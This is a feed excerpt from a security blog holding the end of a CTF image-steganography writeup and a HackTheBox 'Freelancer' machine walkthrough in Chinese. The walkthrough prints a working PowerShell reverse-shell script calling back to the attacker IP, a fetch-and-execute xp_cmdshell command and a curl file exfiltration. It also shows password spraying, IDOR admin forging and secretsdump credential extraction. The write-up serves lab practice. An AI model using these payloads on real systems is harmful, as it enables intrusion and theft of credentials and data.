class="built_in">width</span>):</span><br><span class="line">            new_j = (a_b_plus_1 * j - a * i) <span class="symbol">%</span> <span class="built_in">height</span></span><br><span class="line">            new_i = (negative_b * j + i) <span class="symbol">%</span> <span class="built_in">width</span></span><br><span class="line">            res_img[new_j, new_i] = img[j, i]</span><br><span class="line">    Image.fromarray(<span class="built_in">np</span>.uint8(res_img)).<span class="built_in">save</span>(fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    a = <span class="number">0x6f6c53</span></span><br><span class="line">    b = <span class="number">0x729e</span></span><br><span class="line">    arnold(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\php\\测试\\00000000.jpg&quot;</span>, <span class="number">7</span>, <span class="number">35</span>, <span class="string">&quot;D:\\phpstudy_pro\\WWW\\php\\测试\\000000001.jpg&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能得到后半部分flag</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6o6ubzMV4ShGJN2Q.png!thumbnail" alt="img"></p><p>之后把图片文件头16进制放到a.txt,里面用bkcrack工具来进行明文爆破得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">f45dd89f</span> e3e929fb <span class="number">3202</span>ba17</span><br></pre></td></tr></table></figure><p>再利用该工具修改压缩包的密码为123456</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/pgTaL7zQNqp89zu7.png!thumbnail" alt="img"></p><p>解压即可得到flag.png,之后更改一下图片的宽高即可得到前半段flag</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/kEFaQYqpZJzKTp4n.png!thumbnail" alt="img"></p><p>两段flag一拼即可</p>]]></content>
    
    
    <summary type="html">鹏城杯 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Freelancer</title>
    <link href="https://ya1orin.github.io/posts/8sdfch788.html"/>
    <id>https://ya1orin.github.io/posts/8sdfch788.html</id>
    <published>2024-10-30T11:15:05.000Z</published>
    <updated>2024-11-13T05:17:59.351Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.11.5</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>MSSQL通过xp_cmdshell 实现RCE</li><li>密码喷洒</li><li>滥用GenericWrite</li><li>RBCD约束委派</li><li>PTH传递攻击</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.11.5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 19:20 CST</span><br><span class="line">Warning: 10.10.11.5 giving up on port because retransmission cap hit (10).</span><br><span class="line">sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.5, 16) =&gt; Operation not permitted</span><br><span class="line">Offending packet: TCP 10.10.16.4:35511 &gt; 10.10.11.5:8189 S ttl=44 id=31021 iplen=44  seq=2972970908 win=1024 &lt;mss 1460&gt;</span><br><span class="line">Nmap scan report for 10.10.11.5</span><br><span class="line">Host is up (0.83s latency).</span><br><span class="line">Not shown: 59837 closed tcp ports (reset), 5672 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          nginx 1.25.5</span><br><span class="line">|_http-title: Did not follow redirect to http://freelancer.htb/</span><br><span class="line">|_http-server-header: nginx/1.25.5</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 16:21:28Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49683/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49704/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Instance name: SQLEXPRESS</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|     TCP port: 55297</span><br><span class="line">|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query</span><br><span class="line">|_    Clustered: false</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-10-30T16:19:02</span><br><span class="line">|_Not valid after:  2054-10-30T16:19:02</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Target_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Domain_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Computer_Name: DC</span><br><span class="line">|     DNS_Domain_Name: freelancer.htb</span><br><span class="line">|     DNS_Computer_Name: DC.freelancer.htb</span><br><span class="line">|     DNS_Tree_Name: freelancer.htb</span><br><span class="line">|_    Product_Version: 10.0.17763</span><br><span class="line">|_ssl-date: 2024-10-30T16:23:30+00:00; +5h00m04s from scanner time.</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|Vista|10|2012|Longhorn|7|8.1|2016|11 (94%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_8</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (94%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 2004 (90%), Microsoft Windows Longhorn (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-30T16:23:12</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 5h00m03s, deviation: 0s, median: 5h00m03s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1720/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   689.59 ms 10.10.16.1</span><br><span class="line">2   366.60 ms 10.10.11.5</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds</span><br></pre></td></tr></table></figure><p>开放若干端口，可以看到这是一台域控，根据80端口的结果，可以发现域名<code>freelancer.htb</code>，将其添加到<code>/etc/hosts</code>中，同时存在<code>SQL Server</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.11.5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030193421240-862466878.png" alt="image-20241030193415328"></p><p>smb没有重要信息</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195019202-355984579.png" alt="image-20241030195013398"></p><p>扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://freelancer.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030194522012-1201054933.png" alt="image-20241030194515723"></p><p>访问后还是没什么重要信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210922158-590770136.png" alt="image-20241030210916487"></p><p>随便点了篇文章发现url的数据像是用户的编号</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210950614-402962867.png" alt="image-20241030210944922"></p><p>测试后发现id为2的时候是admin用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195947536-985652884.png" alt="image-20241030195941232"></p><p>注册个自由账户登录后发现路由跳转到<code>/job/search/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030200358580-254071980.png" alt="image-20241030200352902"></p><p>发现还是没有登陆进去</p><p>在注册个员工账户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241103185552789-1784702947.png" alt="image-20241030201044315"></p><p>发现没激活不让登录，注意到两个账户登陆的表单是同一个，还有个忘记密码，尝试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030201435602-1815788951.png" alt="image-20241030201429836"></p><p>通过忘记密码功能成功以员工身份登录到后台</p><h1 id="获得网站admin权限"><a href="#获得网站admin权限" class="headerlink" title="获得网站admin权限"></a>获得网站admin权限</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203205421-979958180.png" alt="image-20241030203159702"></p><p>注意到有个QRcode，扫描一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203726339-1392968181.png" alt="image-20241030203720362"></p><p>有一个url，访问url会跳转到当前用户</p><p>注意到中间可能是base64编码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203803580-1093742398.png" alt="image-20241030203757961"></p><p>解码后发现是10012</p><p>之前知道 admin 的 id 是2，感觉可以尝试伪造一下</p><p><strong>ps: 注意每个QRcode生成的链接有时效性，需要在生成QRcode后就替换并访问（这里我试了好多次）</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030211612757-592831591.png" alt="image-20241030211606674"></p><p>获取到网站的admin权限</p><h1 id="MSSQL通过RCE获得shell"><a href="#MSSQL通过RCE获得shell" class="headerlink" title="MSSQL通过RCE获得shell"></a>MSSQL通过RCE获得shell</h1><p>当前页面并没有什么新的东西，之前目录扫描知道有admin路由，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031155340969-1949040649.png" alt="image-20241031155320549"></p><p>注意到右下角有个<code>SQL Terminal</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241103185612117-1781510714.png" alt="image-20241031160042048"></p><p>简单执行<code>select @@version;</code>发现可以执行sql语句</p><p>尝试利用sql的执行命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031161914233-762073518.png" alt="image-20241031160156445"></p><p>利用SQL枚举，尝试<code>xp_cmdshell</code></p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands">Pentesting MSSQL</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162235113-1486071814.png" alt="image-20241031162228101"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> b.name <span class="keyword">FROM</span> sys.server_permissions a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_principals b <span class="keyword">ON</span> a.grantor_principal_id <span class="operator">=</span> b.principal_id <span class="keyword">WHERE</span> a.permission_name <span class="operator">=</span> <span class="string">&#x27;IMPERSONATE&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162246707-191596372.png" alt="image-20241031162238631"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162256855-652593550.png" alt="image-20241031162249651"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> xp_cmdshell whoami;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162307485-1009571644.png" alt="image-20241031162300569"></p><p>接着执行命令获取shell，但是测试后发现有杀软</p><p>准备一个ps1脚本（找了好久才找到，大多数都被杀了，人都麻了）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.ps1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment"># Delay before establishing network connection, and between retries</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to C2</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;10.10.16.4&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125; <span class="keyword">until</span> (<span class="variable">$TCPClient</span>.Connected)</span><br><span class="line"></span><br><span class="line"><span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream()</span><br><span class="line"><span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writes a string to C2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteToStream</span> <span class="params">(<span class="variable">$String</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$script:Buffer</span> = <span class="number">0</span>..<span class="variable">$TCPClient</span>.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write to C2</span></span><br><span class="line">    <span class="variable">$StreamWriter</span>.Write(<span class="variable">$String</span> + <span class="string">&#x27;SHELL&gt; &#x27;</span>)</span><br><span class="line">    <span class="variable">$StreamWriter</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span></span><br><span class="line">WriteToStream <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span></span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$BytesRead</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment"># Encode command, remove last byte/newline</span></span><br><span class="line">    <span class="variable">$Command</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$BytesRead</span> - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Execute command and save output (including errors thrown)</span></span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">Invoke-Expression</span> <span class="variable">$Command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="variable">$_</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write output to C2</span></span><br><span class="line">    WriteToStream (<span class="variable">$Output</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Closes the StreamWriter and the underlying TCPClient</span></span><br><span class="line"><span class="variable">$StreamWriter</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031163434222-1715803624.png" alt="image-20241031163426947"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> xp_cmdshell <span class="string">&#x27;powershell -c iex(iwr -usebasicparsing http://10.10.16.4/shell.ps1)&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031180128183-1871641448.png" alt="image-20241031180120472"></p><p>成功获得shell</p><h1 id="sql-svc-gt-mikasaAckerman"><a href="#sql-svc-gt-mikasaAckerman" class="headerlink" title="sql_svc-&gt;mikasaAckerman"></a>sql_svc-&gt;mikasaAckerman</h1><p>先简单查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031181451778-69892735.png" alt="image-20241031181444181"></p><p>在<code>C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU</code>目录下的<code>sql-Configuration.INI</code>文件中找到俩密码<code>IL0v3ErenY3ager</code>和<code>t3mp0r@ryS@PWD</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031182535485-866862623.png" alt="image-20241031182527902"></p><p>将<code>C:\Users</code>中的用户名保存到<code>users</code>文件中，密码保存至<code>passwd</code>文件中，尝试密码喷洒</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb freelancer.htb -u <span class="built_in">users</span> -p passwd</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031183827237-1394554085.png" alt="image-20241031183819307"></p><p>找到一组正确的凭据<code>mikasaAckerman:IL0v3ErenY3ager</code></p><p>但是<code>winrm</code>并没有成功的凭据</p><p>使用<a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>进行横向，先上传至靶机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="number">10.10</span>.<span class="number">16.4</span>/RunasCs.exe <span class="literal">-outfile</span> RunasCs.exe</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185139899-1944749946.png" alt="image-20241031185131983"></p><p>靶机执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe mikasaAckerman <span class="string">&quot;IL0v3ErenY3ager&quot;</span> <span class="literal">-d</span> freelancer.htb cmd <span class="literal">-r</span> <span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">8889</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185732331-1762507818.png" alt="image-20241031185724497"></p><p>成功获得<code>mikasaackerman</code>用户权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185853820-131256646.png" alt="image-20241031185846521"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><h1 id="mikasaAckerman-gt-lorra199"><a href="#mikasaAckerman-gt-lorra199" class="headerlink" title="mikasaAckerman-&gt;lorra199"></a>mikasaAckerman-&gt;lorra199</h1><p>在<code>mikasaAckerman</code>桌面还有两个文件，其中一个是压缩包</p><p>先看下<code>mail.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031190704941-974279194.png" alt="image-20241031190657225"></p><p>通过smb文件共享来传输文件，这里使用<code>httpuploadexfil</code>工具实现 </p><p>先在攻击机建立监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./httpuploadexfil :9999 /root/HackTheBox/Freelancer/share</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192056276-848032017.png" alt="image-20241031192048419"></p><p>靶机执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="operator">-F</span> <span class="string">&quot;file=@MEMORY.7z&quot;</span> http://<span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">9999</span>/p</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192808087-2027884009.png" alt="image-20241031192800564"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031193202144-454390878.png" alt="image-20241031193154701"></p><p>解压后发现是个 <code>DMP</code>文件</p><p>使用<a href="https://github.com/ufrisk/MemProcFS">MemProcFS</a>进行分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./memprocfs -device /root/HackTheBox/Freelancer/share/MEMORY.DMP -mount /root/HackTheBox/Freelancer/dmp_mnt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194502165-752955147.png" alt="image-20241031194454182"></p><p>将其挂载到一个空目录，在切换终端查看该目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194557174-879320302.png" alt="image-20241031194549629"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194716386-270783784.png" alt="image-20241031194708714"></p><p>发现在<code>registry/hive_files</code>目录下找到SAM、SYSTEM和SECURITY文件</p><p>使用<code>secretsdump</code>导出hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194947565-950391359.png" alt="image-20241031194939897"></p><p>发现在最下面有一串明文密码<code>PWN3D#l0rr@Armessa199</code></p><p>继续尝试密码喷洒</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031195259082-1047005503.png" alt="image-20241031195251538"></p><p>找到一组凭据<code>lorra199:PWN3D#l0rr@Armessa199</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201223159-1255973466.png" alt="image-20241031201215390"></p><p>winrm发现也可以使用，直接使用<code>evil-winrm</code>登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201409985-1471373558.png" 